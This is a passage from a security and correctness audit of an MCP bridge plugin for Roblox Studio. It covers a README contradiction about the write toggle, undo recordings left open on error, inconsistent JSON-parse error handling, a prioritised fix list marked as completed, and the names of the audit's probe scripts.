## 30. Medium — `README.md:172` says the write gate doesn't exist in this build

**File:** `README.md:172`

```
**Writes are always-on** in this build. Destructive batches ... still need confirm: true.
```

This directly contradicts `CLAUDE.md:46` ("Write-class tools ... require the user's *Allow
writes* toggle") and the code (`server.ts:386-393`, `bridge.ts:289`). It is the most
consequential doc contradiction in the repo and the original finding 20 missed it. It also
cuts against finding 1's "the documented default" phrasing. If the shipped plugin really
reports `writeEnabled: true` always, finding 2's bypass is largely moot (the gate is open
regardless) while finding 1 gets worse (nothing ever returns 403). **This contradiction must
be resolved first — it decides how findings 1, 2 and 27 are graded.**

## 31. Low — some `pro.ts` builders leave an undo recording open on error

**File:** `src/pro.ts:531-574` (`constraint_add`), `src/pro.ts:630-689` (`sky_configure`)

**Plausible, code-read only — no Luau was executed.** Several `pro.ts` builders open a
`ChangeHistoryService` recording and then do unguarded property writes with caller-supplied,
type-unchecked values (finding 3's root cause). `constraint_add` does `Instance.new(a.type)`
on any class name, then `c.Attachment0 = at0` — which throws for a class without that property,
mid-recording. `sky_configure` sets `sky[prop] = val` similarly. Because `TryBeginRecording`
returns nil while a recording is already open, a throw between begin and finish would mean
subsequent MCP writes silently stop being undoable. `workspace_configure` wraps each write in
`pcall`; its neighbours don't. Whether the plugin surfaces or swallows this is not visible here.

**Fix direction:** wrap the body in `pcall` and `Cancel` the recording on error, the way
`workspace_configure` already does.

## 32. Low — `/poll` and `/rpc` lack the malformed-body try/catch `/result` has

**File:** `src/bridge.ts:173-196` (`/poll`), `src/bridge.ts:263-311` (`/rpc`)

`/result` deliberately catches a malformed JSON body and returns a structured 400
(`bridge.ts:200-227`); `/poll` and `/rpc` let the parse error fall through to the generic 500
in `start()`, which echoes the raw parser message. Cosmetic, but inconsistent with the care
already taken one handler over.

**Fix direction:** share one body-read-and-parse helper that returns a structured 400 across
all three routes.

---

## Suggested order of work

0. **Finding 30** — resolve the README-vs-code contradiction first. Whether writes are
   toggle-gated or always-on decides how 1, 2 and 27 are graded and fixed. One-line answer,
   blocks everything else.
1. **Findings 1 + 27 + 28** — authenticate the bridge in *both* directions. The write toggle
   and every result must come from a trusted channel, not an unauthenticated request body.
   Add Origin/Host/Content-Type checks and a deny-by-default tool gate on top. This is the
   whole ballgame: without it no property of the bridge holds.
2. **Findings 2 + 3 + 16** — one theme: safety flags and schemas are decorative because
   nothing validates or enforces them. Add schema validation, invert `evalTool`'s default,
   make unknown op verbs fail closed.
3. **Findings 4, 5, 29** — bridge robustness: body cap, queue cap, socket-close handling.
4. **Findings 7, 8, 9, 11, 12** — correctness bugs where the code's stated contract and its
   behaviour disagree. Each is small and independently fixable.
5. **Finding 21** — land unit tests for `safety`, `session.evict`, `luaJson`, and
   `snapshot-diff` so findings 8, 12, 16 and 17 cannot regress.
6. **Findings 20 + 30** — docs, once the code settles.

> **This list is history.** Every item above is done — see the status banner in
> `ISSUES.md`. Two notes so the text is not misread as open work: finding 12 was
> **withdrawn as a false positive**, not fixed; and `session.evict` no longer exists,
> because the tool set became grow-only (`PLAN.md` Part 1), so the test that replaced it
> asserts the opposite invariant — nothing is ever dropped.
>
> For what is actually next, read `PLAN.md`.

---

## Reproduction harness

The probes used for this audit live in the session scratchpad, not in the repo:

- `fakeplugin.mjs` — stub Studio plugin: long-polls `/poll`, echoes commands to `/result`,
  configurable `writeEnabled`.
- `mcpclient.mjs` — minimal MCP stdio client exposing raw `tools/call` results so `isError`
  is observable.
- `p1_writegate.mjs` (finding 2), `p2_evict.mjs` (8), `p3_proto.mjs` (9, 15),
  `p4_psinject.mjs` (3), `p5_bridge.mjs` (1, 4, 6), `p6_waiter.mjs` (5),
  `p7_misc.mjs` (11, 12, 16, 17), `p8_more.mjs` (7, 10, 18), `p9_rpc.mjs` (1, 19),
  `p10_chain.mjs` (1), `p11_verify.mjs` (6 recovery), `p12_m1.mjs` (27).

The verification pass added its own probes under `scratchpad/agent1/` (`a1`-`a9`, `b1`, `b2`,
`c1`-`c4`) covering findings 27-30 and the re-graded ones.

They are worth promoting into `test/` as regression tests — most of them are already
assertions in all but name.
